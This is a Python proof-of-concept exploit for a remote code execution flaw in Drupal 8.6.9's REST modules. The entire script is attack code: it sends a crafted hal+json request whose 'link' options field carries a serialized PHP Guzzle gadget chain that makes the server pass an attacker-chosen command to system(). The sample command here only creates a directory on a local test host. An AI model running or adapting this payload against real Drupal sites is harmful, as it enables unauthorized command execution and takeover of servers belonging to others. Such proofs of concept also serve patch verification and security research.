# Tested on Drupal 8.6.9 with all 4 of the REST modules turned on: HAL, HTTP Basic Authentication, RESTful Web Services, Serialization
import requests
import json

remote_command_to_execute = 'mkdir /home/nanodano/itworks'
host = 'http://127.0.0.1:8000'

url = host + '/node/3'
headers = {
  'Content-Type': 'application/hal+json',
  'Cache-Control': 'no-cache',
  'Accept': 'application/hal+json',
}
query = {
  '_format': 'hal_json',
}

data = {
  'link': [{'value': 'link',
            'options':  "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000"
                        "GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\""
                        "close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:"
                        "{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";"
                        "s:|size|:\"|command|\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000"
                        "stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000"
                        "GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\""
                        "resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"
                        "".replace('|size|', str(len(remote_command_to_execute))).replace('|command|', remote_command_to_execute)
            }
          ],
  '_links': {'type': {'href': host + '/rest/type/shortcut/default'}},
}
response = requests.get(url, params=query, data=json.dumps(data).encode('utf-8'), headers=headers)
